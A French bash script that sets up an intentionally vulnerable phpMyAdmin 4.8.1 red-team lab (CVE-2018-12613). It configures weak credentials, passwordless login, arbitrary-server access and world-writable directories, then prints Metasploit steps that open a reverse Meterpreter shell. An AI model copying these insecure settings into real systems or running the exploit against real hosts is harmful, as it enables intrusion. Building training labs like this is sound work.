#!/bin/bash

###############################################################################
# Iron4Software Red Team Lab - Installation phpMyAdmin 4.8.1 Vuln√©rable
# CVE-2018-12613 - Local File Inclusion ‚Üí Remote Code Execution
# Exploitation: Metasploit exploit/multi/http/phpmyadmin_lfi_rce
###############################################################################

set -e

echo "========================================================"
echo "  Iron4Software Lab - phpMyAdmin 4.8.1 Vuln√©rable"
echo "  CVE-2018-12613 - LFI ‚Üí RCE"
echo "========================================================"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Ce script doit √™tre ex√©cut√© en tant que root (sudo)"
    exit 1
fi

WEB_ROOT="/var/www/html"
PMA_DIR="$WEB_ROOT/phpmyadmin"
PMA_VERSION="4.8.1"
PMA_URL="https://files.phpmyadmin.net/phpMyAdmin/${PMA_VERSION}/phpMyAdmin-${PMA_VERSION}-all-languages.tar.gz"

echo "[1/8] V√©rification des d√©pendances..."
apt update -qq
apt install -y wget php php-mysql php-mbstring php-zip php-gd php-json php-curl mysql-server > /dev/null 2>&1
echo "‚úÖ D√©pendances install√©es"

echo "[2/8] D√©marrage MySQL..."
systemctl start mysql
systemctl enable mysql > /dev/null 2>&1
echo "‚úÖ MySQL d√©marr√©"

echo "[3/8] Configuration MySQL..."
# Cr√©er un utilisateur MySQL pour phpMyAdmin
mysql -e "CREATE USER IF NOT EXISTS 'pma'@'localhost' IDENTIFIED BY 'pmapass';" 2>/dev/null || true
mysql -e "GRANT ALL PRIVILEGES ON *.* TO 'pma'@'localhost' WITH GRANT OPTION;" 2>/dev/null || true
mysql -e "FLUSH PRIVILEGES;" 2>/dev/null || true
echo "‚úÖ Utilisateur MySQL cr√©√© (pma:pmapass)"

echo "[4/8] T√©l√©chargement phpMyAdmin ${PMA_VERSION}..."
cd /tmp
if [ -f "phpMyAdmin-${PMA_VERSION}.tar.gz" ]; then
    rm -f "phpMyAdmin-${PMA_VERSION}.tar.gz"
fi
wget -q "$PMA_URL" -O "phpMyAdmin-${PMA_VERSION}.tar.gz"
echo "‚úÖ phpMyAdmin t√©l√©charg√©"

echo "[5/8] Extraction et installation..."
if [ -d "$PMA_DIR" ]; then
    echo "‚ö†Ô∏è  Suppression de l'ancien phpMyAdmin..."
    rm -rf "$PMA_DIR"
fi

tar -xzf "phpMyAdmin-${PMA_VERSION}.tar.gz" -C /tmp/
mv "/tmp/phpMyAdmin-${PMA_VERSION}-all-languages" "$PMA_DIR"
echo "‚úÖ phpMyAdmin extrait dans $PMA_DIR"

echo "[6/8] Configuration phpMyAdmin..."
cd "$PMA_DIR"
cp config.sample.inc.php config.inc.php

# G√©n√©rer un blowfish secret
BLOWFISH_SECRET=$(openssl rand -base64 32 | tr -d "=+/" | cut -c1-32)

# Configurer config.inc.php
cat > config.inc.php << EOF
<?php
\$cfg['blowfish_secret'] = '${BLOWFISH_SECRET}';

\$i = 0;
\$i++;

\$cfg['Servers'][\$i]['auth_type'] = 'cookie';
\$cfg['Servers'][\$i]['host'] = 'localhost';
\$cfg['Servers'][\$i]['compress'] = false;
\$cfg['Servers'][\$i]['AllowNoPassword'] = true;

\$cfg['UploadDir'] = '';
\$cfg['SaveDir'] = '';

// VULNERABLE CONFIGURATION - DO NOT USE IN PRODUCTION
\$cfg['AllowArbitraryServer'] = true;
?>
EOF

echo "‚úÖ Configuration phpMyAdmin cr√©√©e"

echo "[7/8] Permissions..."
mkdir -p "$PMA_DIR/tmp"
chown -R www-data:www-data "$PMA_DIR"
chmod -R 755 "$PMA_DIR"
chmod 777 "$PMA_DIR/tmp"
echo "‚úÖ Permissions configur√©es"

echo "[8/8] Cr√©ation de la page d'information..."
cat > "$WEB_ROOT/info.html" << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iron4Software - Infrastructure Info</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
            background: white;
            border-radius: 12px;
            padding: 40px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        h1 {
            color: #2c3e50;
            border-bottom: 3px solid #667eea;
            padding-bottom: 15px;
        }
        .service {
            background: #f8f9fa;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid #667eea;
            border-radius: 4px;
        }
        a {
            display: inline-block;
            margin-top: 10px;
            padding: 10px 20px;
            background: #667eea;
            color: white;
            text-decoration: none;
            border-radius: 5px;
        }
        a:hover { background: #764ba2; }
        .warning {
            background: #ffe6e6;
            border-left: 4px solid #e74c3c;
            padding: 15px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üè¢ Iron4Software - Services Internes</h1>
        
        <div class="service">
            <h3>üìß Webmail</h3>
            <p>Service de messagerie Roundcube pour les employ√©s.</p>
            <a href="/">Acc√©der au Webmail</a>
        </div>

        <div class="service">
            <h3>üóÑÔ∏è phpMyAdmin</h3>
            <p>Interface d'administration des bases de donn√©es.</p>
            <a href="/phpmyadmin/">Acc√©der √† phpMyAdmin</a>
        </div>

        <div class="warning">
            <strong>‚ö†Ô∏è Acc√®s R√©serv√©</strong><br>
            Ces services sont r√©serv√©s au personnel autoris√© d'Iron4Software.
        </div>
    </div>
</body>
</html>
EOF

chmod 644 "$WEB_ROOT/info.html"
echo "‚úÖ Page d'information cr√©√©e"

# Informations serveur
SERVER_IP=$(hostname -I | awk '{print $1}')
HOSTNAME=$(hostname)

echo ""
echo "========================================================"
echo "  ‚úÖ Installation termin√©e avec succ√®s !"
echo "========================================================"
echo ""
echo "üìä Configuration :"
echo "   Hostname       : $HOSTNAME"
echo "   IP             : $SERVER_IP"
echo "   phpMyAdmin     : $PMA_DIR"
echo "   Version        : $PMA_VERSION"
echo ""
echo "üîê Credentials MySQL :"
echo "   User           : pma"
echo "   Password       : pmapass"
echo "   (ou connexion sans mot de passe activ√©e)"
echo ""
echo "üéØ Vuln√©rabilit√© :"
echo "   CVE            : CVE-2018-12613"
echo "   Type           : Local File Inclusion ‚Üí RCE"
echo "   Exploit MSF    : exploit/multi/http/phpmyadmin_lfi_rce"
echo ""
echo "üåê URLs d'acc√®s :"
echo "   Info page      : http://$SERVER_IP/info.html"
echo "   phpMyAdmin     : http://$SERVER_IP/phpmyadmin/"
echo "   Webmail        : http://$SERVER_IP/"
echo ""
echo "üß™ Test local :"
echo "   curl http://localhost/phpmyadmin/"
echo ""

# Test
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost/phpmyadmin/ 2>/dev/null || echo "000")

if [ "$HTTP_CODE" = "200" ]; then
    echo "‚úÖ phpMyAdmin accessible (HTTP 200)"
else
    echo "‚ö†Ô∏è  phpMyAdmin ne r√©pond pas (HTTP $HTTP_CODE)"
fi

echo ""
echo "========================================================"
echo "  üî• EXPLOITATION AVEC METASPLOIT"
echo "========================================================"
echo ""
echo "1Ô∏è‚É£  V√©rifier l'acc√®s depuis Kali :"
echo "    curl http://mail.iron4software.local/phpmyadmin/"
echo ""
echo "2Ô∏è‚É£  Reconnaissance :"
echo "    nmap -sV -p 80 --script http-enum mail.iron4software.local"
echo ""
echo "3Ô∏è‚É£  Exploitation Metasploit :"
echo "    msfconsole -q"
echo "    use exploit/multi/http/phpmyadmin_lfi_rce"
echo "    set RHOSTS mail.iron4software.local"
echo "    set TARGETURI /phpmyadmin/"
echo "    set LHOST 192.168.100.10"
echo "    set LPORT 4444"
echo "    check"
echo "    exploit"
echo ""
echo "4Ô∏è‚É£  Shell Meterpreter attendu :"
echo "    meterpreter > sysinfo"
echo "    meterpreter > getuid"
echo "    meterpreter > shell"
echo ""
echo "========================================================"
echo "  üõ°Ô∏è phpMyAdmin 4.8.1 Vuln√©rable - Pr√™t pour Red Team"
echo "========================================================"
